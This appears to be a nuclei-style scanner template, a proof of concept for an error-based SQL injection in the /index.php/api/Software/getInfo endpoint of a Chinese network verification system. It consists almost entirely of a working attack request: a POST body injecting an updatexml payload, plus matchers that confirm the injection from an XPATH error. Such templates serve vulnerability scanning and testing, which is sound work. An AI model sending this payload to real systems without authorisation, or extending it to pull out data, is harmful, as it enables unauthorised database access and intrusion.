id: poc-yaml-wangluo-verify-system-getinfo-sqli
info:
  name: 网络验证系统 getInfo SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - /index.php/api/Software/getInfo
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "data=123456&id=1 and updatexml(1,concat(0x7e,{{t2}},0x7e),1)"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{substr(t2,0,31)}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
